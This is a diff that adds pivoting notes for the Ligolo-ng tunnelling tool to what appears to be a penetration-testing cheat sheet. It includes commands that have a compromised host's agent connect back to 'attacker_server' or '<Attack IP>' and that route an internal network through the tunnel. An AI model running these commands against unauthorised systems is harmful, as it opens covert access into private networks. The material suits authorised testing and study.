@@ -117,3 +117,41 @@ run
 
 -> Agent
 - https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
+
+-> Installation
+```bash
+sudo apt install ligolo-ng
+```
+
+-> Proxy set up
+```bash
+sudo ip tuntap add user <Your Username> mode tun ligolo
+sudo ip link set ligolo up
+```
+
+-> Start proxy
+```bash
+ligolo-proxy -h
+ligolo-proxy -selfcert
+```
+
+-> Run the agent without ignoring certificates
+```bash
+./agent -connect attacker_server:11601
+```
+
+-> Agent set up
+```bash
+./agent -connect <Attack IP>:11601 -ignore-cert
+```
+
+-> Verify network interfaces
+```bash
+ifconfig
+```
+
+-> Add an entry to the routing table so Ligolo can route traffic through the tunnel and reach the target network
+```bash
+sudo ip route add <Internal_Network> dev ligolo
+start
+```
